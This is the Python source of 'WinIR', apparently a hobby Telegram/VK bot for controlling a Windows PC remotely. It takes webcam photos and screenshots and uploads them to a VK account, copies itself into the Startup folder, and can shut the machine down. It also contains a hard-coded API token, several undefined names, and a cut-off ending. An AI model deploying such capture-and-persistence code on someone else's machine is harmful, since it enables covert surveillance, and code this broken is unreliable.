#libraries
import os,json,datetime,requests,vk_api,random,getpass,shutil,sys,re,psutil
from vk_api import VkUpload
from PIL import Image, ImageGrab#pip install Pillow
import winsound#sound
import threading#многопоточность
from tkinter import*
import __main__#link to file
from vk_api.keyboard import VkKeyboard, VkKeyboardColor#vk_api keyboard
from vk_api.bot_longpoll import VkBotEventType, VkBotLongPoll#util
from datetime import datetime, date, timedelta#date
from bs4 import BeautifulSoup as bs#parsing
from vk_api.longpoll import VkLongPoll, VkEventType#util
from vk_api.utils import get_random_id#util
import cv2#camera pip install opencv-python
import sounddevice as sd
import soundfile as sf
from win32 import win32gui
#from win32gui import GetWindowText, GetForegroundWindow#active apps
import pyttsx3#воспроизведение текста
import time
import numpy as np
import platform 
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
#def's
def file_opening(nomination):#открытие ярлыков(приложений) из рабочего стола
    os.startfile(r'C:\Users\{name1}\Desktop\{name2}'.format(name1=USER_NAME,name2=str(nomination)))

    
def working_time(start_time):#вывод времени работы пк с начала включения
    end_time = time.monotonic()
    return timedelta(seconds=end_time - start_time)

    
def text_speaker(text):#воспроизведение текста на динамиках
    engine=pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

    

def write_msg(user_id, s):#отправка текстового сообщения
    vk_session.method('messages.send', {'user_id':user_id,'message':s,"random_id":random.randint(1, 100)})
    
       
def time_msg(profile_id):#отправка времени включения пк
    global start_time,time_now
    start_time = time.monotonic()
    date_now=date.today().strftime("%d.%m.%y")
    time_now=datetime.today().strftime("%H:%M")
    time_message='Компьютер включен '+str(date_now)+' в '+str(time_now)
    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message=time_message)


def resurs_monitor():#взятие показаний загрузки ЦП(8 секунд) и загрузки ОП(однократно)
    deadtime=time.monotonic()+8
    cpu_mass=[]
    while time.monotonic()<deadtime:
        cpu_mass.append(psutil.cpu_percent())
    feel=None
    if round(np.mean(cpu_mass))>80:
        feel="сильная"
    elif round(np.mean(cpu_mass))<80 and round(np.mean(cpu_mass))>30:
        feel="нормальная"
    else:
        feel="слабая"
        
        
    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message=f'''загрузка цп: {round(np.mean(cpu_mass))}%,
 загрузка памяти: {psutil.virtual_memory()[2]}%.
 нагрузка на систему: {feel}
 ''')

    
def msg_root(event):#вывод текста на экран от пользователя 
    root_text=event.text.lower()
    root=Tk()
    root.title("WinIR-дистанционное управление")
    root.geometry("3000x2500")
    lab=Label(root,text=root_text,font="Arial 16")
    root.call('wm', 'attributes', '.', '-topmost', '1')    
    lab.pack()
    root.mainloop()


def add_to_startup(USER_NAME,file_path=""):
    if file_path=="":
        file_path = __main__.__file__
    b=file_path.split("WinIR.pyw")#####error without real name#####
    filee=b[0]+"WinIR.exe"
    path_txt=b[0]+"recover.json"
    syspath = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    #shutil.move(path_txt,syspath)#перемещаем  .json  в директорию автозагрузки
    shutil.move(filee,syspath)#перемещаем  .exe  в директорию автозагрузки
    

def get_exe():
    files_mass=[]
    file_path=r'C:\Users\%s\Desktop'% USER_NAME
    files=os.listdir(file_path)
    for file in files:
        if '.' in file:
            files_mass.append(file)
    return files_mass
            
    
def getUserName(link):
    user_get=vk.users.get(user_ids = (link))
    user_get=user_get[0]
    first_name=user_get['first_name']
    last_name=user_get['last_name']
    full_name=first_name+" "+last_name
    return first_name,last_name
        
        
def getUserId(link):
    ids = link
    if 'vk.com/' in link: #проверяем на ссылку
        ids = link.split('/')[-1]  # если есть, то получаем его последнюю часть
    if not ids.replace('id', '').isdigit(): # если в нем после отсечения 'id' сами цифры - это и есть id 
        ids = vk.utils.resolveScreenName(screen_name=ids)['object_id'] # если нет, получаем id с помощью метода API
    else:
        ids = ids.replace('id', '')
        
    return ids




def error_msg(profile_id):
    vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='эта функция не может быть выполнена из-за плохого соединения с сервером.повторите попытку...')

def camera():
    time.sleep(2)
    cap = cv2.VideoCapture(0)
    for i in range(30):
        cap.read()   
    ret,frame = cap.read()
    image='cam_photo.png'
    cv2.imwrite(image, frame)   
    cap.release()
    upload=VkUpload(vk_session)
    attachments=[]
    upload_image=upload.photo_messages(photos=image)[0]
    attachments.append("photo{}_{}".format(upload_image['owner_id'],upload_image['id']))   
    vk_session.method('messages.send', {'user_id':profile_id,'message':None,"random_id":random.randint(1, 100),"attachment":','.join(attachments)})
    os.remove(image)
    

def screenshot():
    time.sleep(2)
    img = ImageGrab.grab()
    image='scr_photo.png'
    img.save(image, "PNG")                              
    upload=VkUpload(vk_session)
    attachments=[]
    upload_image=upload.photo_messages(photos=image)[0]                  
    attachments.append("photo{}_{}".format(upload_image['owner_id'],upload_image['id']))   
    vk_session.method('messages.send', {'user_id':profile_id,'message':None,"random_id":random.randint(1, 100),"attachment":','.join(attachments)})
    os.remove(image)

    
    
def secondary_main(token, id_admin, turn_on):#всегдда проверка на слово ""
    bot=telebot.TeleBot(token)
    @bot.message_handler(commands=['notify_on'])
    def start_message(message):
        try:
            USER_NAME = getpass.getuser()
            redirect="recover.json"
            file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
            json_path=f"{file_path}\{redirect}"#link to .json file
            info_list={
                'token':token,
                'id_admin':id_admin,
                'notification_status': True,
                'turn_on': turn_on+1           
                }
                           
            with open(json_path,"w") as file:
                json.dump(info_list,file,indent=2,ensure_ascii=False)#запись id в .json
            
        except Exception as a:
            print(a)

        else:
            print("1")
            bot.send_message(id_admin,"Уведомления были включены. Для выключения введите команду /notify_off")
            bot.stop_polling()
            main(token, id_admin, turn_on)

    bot.polling()


    
def main(token, id_admin, turn_on):    
    global sound_stat
    
    #system variables
    file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
    cam_path=f"{file_path}\screen.png"
    screen_path=f"{file_path}\cam.png"
    try:
        os.remove(cam_path)#проверка и удаление фотографий
    except:
        pass
    try:
        os.remove(screen_path)#проверка и удаление фотографий
    except:
        pass
    
    bot=telebot.TeleBot(token)
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = KeyboardButton("Управление🚀")
    btn2 = KeyboardButton("Работа с файлами📁")
    btn3 = KeyboardButton("Управление питанием🔋")
    btn4 = KeyboardButton("Сведения и информацияℹ")
    btn5 = KeyboardButton("Настройки⚙")
    markup.add(btn1, btn2, btn3, btn4, btn5)
    markup_functional = ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = KeyboardButton("Звуковое оповещение")
    btn2 = KeyboardButton("Вывод текста")
    btn3 = KeyboardButton("Веб-камера")
    btn4 = KeyboardButton("Создание окна")
    btn5 = KeyboardButton("Веб-камера")
    btn6 = KeyboardButton("Открытие файлов/приложений")
    btn_newpage = KeyboardButton("След. страница➡️")
    btn_exit = KeyboardButton("Главное меню🔙")
    markup_functional.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
    start_time = time.monotonic()
    date_now=date.today().strftime("%d.%m.%y")
    time_now=datetime.today().strftime("%H:%M")
    time_message='Компьютер включен '+str(date_now)+' в '+str(time_now)
    bot.send_message(id_admin,time_message,reply_markup=markup)
    
    
    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if call.data == " ":
            pass

        
    menu_stat=False
    sound_stat=False
    @bot.message_handler(content_types=['text'])
    def get_text_messages(message):
        global menu_stat, sound_stat
        ######################################################################################################
        if message.text.lower() == "управление🚀" or message.text.lower() == "управление":
            bot.send_message(id_admin,"Выберите действие на клавиатуре:", reply_markup=markup_functional)
            menu_stat="control"
            
        elif message.text.lower() == "след. страница➡️" and menu_stat=="control":
            bot.send_message(id_admin, "Новые функции только разрабатываются, следите за обновлениями!")



        elif message.text.lower() == "звуковое оповещение":
            markup_exit = ReplyKeyboardMarkup(resize_keyboard=True)
            btn_exit = KeyboardButton("Отмена")
            markup_exit.add(btn_exit)
            bot.send_message(id_admin, "Введите время воспроизведения звукового сигнала(в секундах)", reply_markup=markup_exit)
            sound_stat=True
            
        elif menu_stat=="control" and sound_stat==True and message:
            try:
                if message.text.lower()=="отмена":
                    bot.send_message(id_admin, "Действие отменено. Выберите действие на клавиатуре:", reply_markup=markup_functional)
                    
                elif int(message.text.lower())<=10 and int(message.text.lower())>0:
                    winsound.Beep(500,int(message.text.lower())*1000)
                    bot.send_message(id_admin, f'Был произведён гудок длительностью: {message.text} сек.', reply_markup=markup_functional)

                elif int(message.text.lower())<0:
                    bot.send_message(id_admin, f'Время {message.text} отрицательно! Попробуйте ещё раз', reply_markup=markup_functional)

                elif int(message.text.lower())==0:
                    bot.send_message(id_admin, 'Время не может быть нулевым! Попробуйте ещё раз', reply_markup=markup_functional)
                    
                elif int(message.text.lower())>10:
                    bot.send_message(id_admin, 'Гудки больше 10 сек. бот не производит!', reply_markup=markup_functional)
                        
                sound_stat=False
            except ValueError:
                bot.send_message(id_admin, 'Вы ввели не число! Попробуйте ещё раз', reply_markup=markup_functional)
                sound_stat=False

        ######################################################################################################
        elif message.text.lower() == "работа с файлами📁" or message.text.lower() == "работа с файлами":
            markup = ReplyKeyboardMarkup(resize_keyboard=False)
            btn1 = KeyboardButton("Звуковое оповещение")
            btn2 = KeyboardButton("Вывод текста")
            btn3 = KeyboardButton("Веб-камера")
            btn4 = KeyboardButton("Создание окна")
            btn5 = KeyboardButton("Веб-камера")
            btn6 = KeyboardButton("Открытие файлов/приложений")
            btn_newpage = KeyboardButton("След. страница")
            btn_exit = KeyboardButton("Главное меню🔙")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
            bot.send_message(id_admin,"Выберите действие на клавиатуре:",reply_markup=markup)
        ######################################################################################################
          
        elif message.text.lower() == "управление питанием🔋" or message.text.lower() == "управление питанием":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("Power off🛑")
            btn2 = KeyboardButton("Restart🔃")
            btn3 = KeyboardButton("Sleep mode💤")
            btn_exit = KeyboardButton("Главное меню🔙")
            markup.add(btn1, btn2, btn3, btn_exit)
            bot.send_message(id_admin,"Выберите действие на клавиатуре:",reply_markup=markup)
        ######################################################################################################
        elif message.text.lower() == "сведения и информацияℹ" or message.text.lower() == "сведения и информация":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("Звуковое оповещение")
            btn2 = KeyboardButton("Вывод текста")
            btn3 = KeyboardButton("Веб-камера")
            btn4 = KeyboardButton("Создание окна")
            btn5 = KeyboardButton("Веб-камера")
            btn6 = KeyboardButton("Открытие файлов/приложений")
            btn_newpage = KeyboardButton("След. страница")
            btn_exit = KeyboardButton("Главное меню🔙")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
            bot.send_message(id_admin,"Выберите действие на клавиатуре:",reply_markup=markup)
        ######################################################################################################
        elif message.text.lower() == "настройки⚙" or message.text.lower() == "настройки":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("Звуковое оповещение")
            btn2 = KeyboardButton("Вывод текста")
            btn3 = KeyboardButton("Веб-камера")
            btn4 = KeyboardButton("Создание окна")
            btn5 = KeyboardButton("Веб-камера")
            btn6 = KeyboardButton("Открытие файлов/приложений")
            btn_newpage = KeyboardButton("След. страница")
            btn_exit = KeyboardButton("Главное меню🔙")
            markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn_exit, btn_newpage)
            bot.send_message(id_admin,"Выберите действие на клавиатуре:",reply_markup=markup)



        elif message.text.lower()== "главное меню🔙" or message.text.lower() == "главное меню":
            markup = ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = KeyboardButton("Управление🚀")
            btn2 = KeyboardButton("Работа с файлами📁")
            btn3 = KeyboardButton("Управление питанием🔋")
            btn4 = KeyboardButton("Сведения и информацияℹ")
            btn5 = KeyboardButton("Настройки⚙")
            markup.add(btn1, btn2, btn3, btn4, btn5)
            bot.send_message(id_admin,"Выберите действие на клавиатуре:",reply_markup=markup)

    bot.polling()
    #variables from vk_api
    vk_session = vk_api.VkApi(token='24ad85b542c917f1cadf8aebdc640f6e6e0b090e32f88798e9ccb7ded37edea5f194efddf8f50875014c2')
    longpoll = VkLongPoll(vk_session)
    vk = vk_session.get_api()
    
    #keyboard
    medium = VkKeyboard(one_time=False)
    medium.add_line()
    
    keyboard_yes_no = VkKeyboard(one_time=False)
    keyboard_yes_no.add_button('да', color=VkKeyboardColor.PRIMARY)
    keyboard_yes_no.add_line()
    keyboard_yes_no.add_button('нет', color=VkKeyboardColor.POSITIVE)


    #keyboard "меню функций"
    keyboard = VkKeyboard(one_time=False)
    keyboard.add_button('Создание окна', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('Активные приложения', color=VkKeyboardColor.POSITIVE)
    keyboard.add_line()    
    keyboard.add_button('Воспроизведение текста', color=VkKeyboardColor.POSITIVE)
    keyboard.add_line()
    keyboard.add_button('Скриншот', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('Гудок', color=VkKeyboardColor.POSITIVE)
    keyboard.add_button('Камера', color=VkKeyboardColor.POSITIVE)
    keyboard.add_line()
    keyboard.add_button('Главное меню', color=VkKeyboardColor.NEGATIVE)
    keyboard.add_line()
    keyboard.add_button('След. страница')    

    #keyboard_one "меню назад"
    keyboard_one = VkKeyboard(one_time=True)
    keyboard_one.add_button('Назад', color=VkKeyboardColor.POSITIVE)
    


    #static_board "основное меню"
    static_board = VkKeyboard(one_time=False)
    static_board.add_button("Функции",color=VkKeyboardColor.POSITIVE)
    static_board.add_line()
    static_board.add_button("Статистика",color=VkKeyboardColor.PRIMARY)
    static_board.add_line()
    static_board.add_button("Системные функции",color=VkKeyboardColor.NEGATIVE)
    static_board.add_line()
    static_board.add_button("След. страница")
    
    #static_board2 "основное меню"
    keyboard2 = VkKeyboard(one_time=False)
    keyboard2.add_button("Выключение",color=VkKeyboardColor.POSITIVE)
    keyboard2.add_button("Монитор ресурсов",color=VkKeyboardColor.POSITIVE)
    keyboard2.add_line()
    keyboard2.add_button('Главное меню', color=VkKeyboardColor.NEGATIVE)
    keyboard2.add_line()
    keyboard2.add_button('Пред. страница')

    #system_board "основное меню"
    system_board = VkKeyboard(one_time=False)
    system_board.add_button('Перезапись id', color=VkKeyboardColor.PRIMARY)
    system_board.add_line()
    system_board.add_button('Выключить уведомления', color=VkKeyboardColor.PRIMARY)
    system_board.add_line()
    #system_board.add_openlink_button('Переключить уведомления', 'https://www.youtube.com/watch?v=W87VM-p446c')
    #system_board.add_line()
    system_board.add_openlink_button('тестовая кнопа', 'https://www.youtube.com/watch?v=W87VM-p446c')
    system_board.add_line()
    system_board.add_button("Главное меню", color=VkKeyboardColor.NEGATIVE)

    #system_notification_board "основное меню"
    system_notification_board = VkKeyboard(one_time=False)
    system_notification_board.add_button('На время', color=VkKeyboardColor.PRIMARY)
    system_notification_board.add_line()
    system_notification_board.add_button('Навсегда', color=VkKeyboardColor.PRIMARY)
    system_notification_board.add_line()
    system_notification_board.add_button("Назад", color=VkKeyboardColor.NEGATIVE)

 
    try:
        add_to_startup()
        
    except:
        pass
    
    try:  
        with open(appdata_path) as file:#путь до автозагрузки
            profile_id=json.load(file)["profile_id"]
        
            
    except:#file not found
        pass

    else:#try прошёл(.json найден)
        
        with open(appdata_path,'r') as file:#путь до автозагрузки
            times=int(json.load(file)["turn_on"])

        person_info=[]
        name_1=getUserName(profile_id)[0]
        name_2=getUserName(profile_id)[1]
        profile_ids=str(getUserId(profile_id))
        with open(appdata_path) as file:#путь до автозагрузки
            notification_status=bool(json.load(file)["notification_status"])

        
        
        info_list={
            'notification_status':notification_status,
            'first_name':name_1,
            'second_name':name_2,
            'profile_id':profile_ids,
            'turn_on':times+1
        
            }
                       
        person_info.append(info_list)
        with open(appdata_path,"w") as file:
            json.dump(info_list,file,indent=2,ensure_ascii=False)#запись id в .json


        new_list_status=False
        for event in longpoll.listen():
            try:
                if event.type == VkEventType.MESSAGE_NEW and event.text: 
                    if event.text.lower()=="функции":
                        print("fun")
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Меню функции бота:')
                        new_list_status=True


                    if event.text.lower()=="пред. страница":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Меню функции бота:')
                        

                    if event.text.lower()=="след. страница":
                        if new_list_status==True:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard2.get_keyboard(),message='страница 2:')
                        else:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='К сожалению новые функции ещё не добавлены &#128549;')

                    if event.text.lower()=="системные функции":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=system_board.get_keyboard(),message='Системное меню бота:')
                        
                    if event.text.lower()=="главное меню":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='Основное меню:')
                        new_list_status=False

                    if event.text.lower()=="статистика":      
                        with open(appdata_path) as file:#путь до автозагрузки
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message=f'Название устройства: {USER_NAME}\n{platform.uname()}\nКол-во включений компьютера: {json.load(file)["turn_on"]} \n время начала сеанса: {time_now}, время работы устройства: {working_time(start_time)} ')
                            
                    if event.text.lower()=="выключить уведомления":                        
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=system_notification_board.get_keyboard(),message='На какое время Вы хотите отключить уведомления?')                
                        longpoll=VkLongPoll(vk_session)
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="назад":
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=system_board.get_keyboard(),message='Изменения не были произведены')
                                    break                        
                                elif event.text.lower()=="на время":
                                    vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=system_notification_board.get_keyboard(),message='Пока что отключение на время недоступно.Выберите другой вариант')                
                                    
                                
                                    #работа с временем
                                elif event.text.lower()=='навсегда':
                                    write_msg(profile_id,'''Вы всегда сможете включить уведомления.Вам всего лишь надо включить компьютер и отправить кодовое слово "включить",после чего Вам снова станут приходить уведомления''')
                                              
                                    try:
                                        person_info=[]
                                        name_1=getUserName(profile_id)[0]
                                        name_2=getUserName(profile_id)[1]
                                        profile_ids=str(getUserId(profile_id))
                                        notification_status=False
                                        with open(appdata_path) as file:
                                            times=json.load(file)["turn_on"]
                                            
                                        info_list={
                                            'notification_status':notification_status,
                                            'first_name':name_1,
                                            'second_name':name_2,
                                            'profile_id':profile_ids,
                                            'turn_on':times
                                        
                                            }
                                                       
                                        person_info.append(info_list)
                                        with open(appdata_path,"w") as file:
                                            json.dump(info_list,file,indent=2,ensure_ascii=False)#запись id в .json
                                        
                                    except Exception as a:
                                        write_msg(profile_id,a)

                                    else:
                                        write_msg(profile_id,"уведомления были успешно выключены")
                                        exit(0)
                                else:
                                    write_msg(profile_id,"выберите один из предложенных вариантов")
                                 
                                    
                    #######################################
                    if event.text.lower()=="перезапись id":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Введите ссылку на страницу в вк или id страницы: ')                
                        longpoll=VkLongPoll(vk_session)
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="назад":
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Изменения не были произведены')
                                    break                        
                                else:
                                    profilee_id=event.text.lower()        
                                    try: 
                                        getUserId(profilee_id)                                    
                                    except Exception:   
                                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='Введён неверный id')  
                                        break

                                    else:
                                        try:
                                            person_info=[]  
                                            full_name=getUserName(getUserId(event.text.lower()))      
                                            profile_new_id=getUserId(event.text.lower())
                                            if int(profile_id)==int(profile_new_id):
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=static_board.get_keyboard(),message='Введён текущий id Вашей страницы')
                                                break

                                            else:
                                                notification_status=True
                                                info_list={
                                                    'notification_status':notification_status,
                                                    'first_name':full_name[0],
                                                    'second_name':full_name[1],
                                                    'profile_id':str(profile_new_id),
                                                    'turn_on':0
                                                
                                                    }
                                            
                                                person_info.append(info_list)                                    
                                                with open(appdata_path,"w") as file1:
                                                    json.dump(info_list,file1,indent=2,ensure_ascii=False)#запись id в .json
                                                vk.messages.send(peer_id=getUserId(event.text.lower()),random_id=get_random_id(),keyboard=static_board.get_keyboard(),message="Это группа управления твоим компьютером! \nТеперь при каждом включении компьютера тебе будет приходить уведомление.\nБота ты всегда можешь отключить во вкладке 'системные функции', а уведомление тебе придёт уже при следующем включении:)")
                                                exit(0)
                                                
                                        except Exception as a:
                                            pass
                                        
                                 
                    if event.text.lower()=="создание окна":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Введите текст для создания текстового окна')               
                        longpoll=VkLongPoll(vk_session)                
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="назад":                            
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Окно не было отправлено')
                                    break
                                else:
                                    root_thread = threading.Thread(target=msg_root, args=(event,))
                                    #msg_root(event)
                                    sound_error_thread = threading.Thread(target=local_sound_error)
                                    sound_error_thread.start()
                                    root_thread.start()
                                    time.sleep(1)
                                    vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'было создано окно с текстом: {event.text.lower()}')
                                    break
                      
                    ######################################        
                    if event.text.lower()=="гудок":
                        try:     
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Введите длительность гудка:')               
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="назад":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Звуковое уведомление не было отправлено')
                                        break
                                    else:                                        
                                        try:
                                            if int(event.text.lower())<=10 and int(event.text.lower())>0:
                                                winsound.Beep(500,int(event.text.lower())*1000)
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'Был произведён гудок с длительностью: {event.text.lower()} сек.')

                                            elif int(event.text.lower())<0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'Время {event.text.lower()} не может быть отрицательным!')

                                            elif int(event.text.lower())==0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Время не может быть нулевым!')
                                            else:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Гудки больше 10 сек. бот не производит!')
                                        except ValueError:
                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Вы ввели не число!')
                                        
                                        break
                                    
                        except Exception:
                            error_msg(profile_id)
                           

                    if event.text.lower()=="воспроизведение текста":
                        try:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Введите текст для вопроизведения:')
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="назад":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Компьютер не был выключен')
                                        break
                                    else:
                                        try:
                                            text_speaker(event.text)

                                        except:
                                            print("eeeeee")

                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Текст был успешно вопроизведен')


                                    break

                        except:
                            pass
                        
                        

                    if event.text.lower()=="открыть файл":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='В данный момент открыт доступ только к файлам рабочего стола,выберите файл для открытия:')
                        time.sleep(1.2)
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_files.get_keyboard(),message=get_exe())

                        longpoll=VkLongPoll(vk_session)                
                        for event in longpoll.listen():
                            if event.type==VkEventType.MESSAGE_NEW:
                                if event.text.lower()=="назад":                            
                                    vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Открытие отменено')
                                    break
                                else:
                                    try:
                                        #keyboard_creation(get_exe())
                                        opening=threading.Thread(target=file_opening,args=(event.text.lower(),))
                                        opening.start()


                                    except Exception as b:
                                        print(b)

                                    else:
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'файл {event.text.lower()} был успешно открыт')

                                        break#exit
                                    


                    if event.text.lower()=="скриншот":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Получение изображения, ожидайте...')
                        try:
                            screenshot()
                        except Exception: 
                            try:
                                screenshot()
                            except Exception:
                                error_msg(profile_id)                                             

                        
                    if event.text.lower()=="камера":
                        vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Получение изображения, ожидайте...')
                        try:
                            camera()
                        except Exception:
                            try:
                                camera()
                            except Exception as a:      
                                print(a)

                    if event.text.lower()=="активные приложения":
                        try:
                            vk.messages.send(peer_id=event.user_id,random_id=get_random_id(),message=GetWindowText(GetForegroundWindow()))
                    
                        except Exception:
                            pass
                            
                    if event.text.lower()=="монитор ресурсов":
                        vk.messages.send(peer_id=event.user_id,random_id=get_random_id(),message="Пожалуйста,подождите 10 секунд...")
                        
                        resurs_monitor()
                        

                    if event.text.lower()=="перезагрузка":
                        try:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Через сколько секунд Вы хотите перезагрузить устройство? ')               
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="назад":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Компьютер не был перезагружен')
                                        break
                                    else:
                                        try:
                                            eventik=event.text.lower()
                                            eventik=int(eventik)

                                        except ValueError:
                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'{event.text.lower()} - это не число!')
                                            break
                                        
                                        else:
                                            if eventik<0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="Время не может быть отрицательным")
                                                break
                                            
                                            elif eventik>36000:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_yes_no.get_keyboard(),message=f'Вы точно уверены,что хотите перезагрузить устройство через {eventik} секунд?')               
                                                longpoll=VkLongPoll(vk_session)                
                                                for event in longpoll.listen():
                                                    if event.type==VkEventType.MESSAGE_NEW:
                                                        if event.text.lower()=="нет":                            
                                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Компьютер  не был перезагружен')
                                                            break
                                                        
                                                        else:
                                                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="Компьютер будет успешно перезагружен:)")
                                                            os.system(f'shutdown /r /t {eventik}')
                                                            break

                                            elif eventik<36000 and eventik>0:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="Компьютер был успешно перезагружен:)")
                                                os.system(f'shutdown /r /t {eventik}')
                                                break

                                            else:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="что-то пошло не так")    
                                                break

                                            break
                        except Exception:
                            error_msg(profile_id)


    
                    if event.text.lower()=="выключение":
                        try:
                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_one.get_keyboard(),message='Через сколько секунд Вы хотите выключить устройство? ')               
                            longpoll=VkLongPoll(vk_session)                
                            for event in longpoll.listen():
                                if event.type==VkEventType.MESSAGE_NEW:
                                    if event.text.lower()=="назад":                            
                                        vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Компьютер не был выключен')
                                        break
                                    else:
                                        try:
                                            eventik=event.text.lower()
                                            eventik=int(eventik)

                                        except ValueError:
                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message=f'{event.text.lower()} - это не число!')
                                            break
                                        
                                        else:
                                            if eventik<0:
                                                vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="Время не может быть отрицательным")
                                                break
                                            
                                            elif eventik>36000:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard_yes_no.get_keyboard(),message=f'Вы точно уверены,что хотите выключить устройство через {eventik} секунд?')               
                                                longpoll=VkLongPoll(vk_session)                
                                                for event in longpoll.listen():
                                                    if event.type==VkEventType.MESSAGE_NEW:
                                                        if event.text.lower()=="нет":                            
                                                            vk.messages.send(user_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message='Компьютер выключен не был')
                                                            break
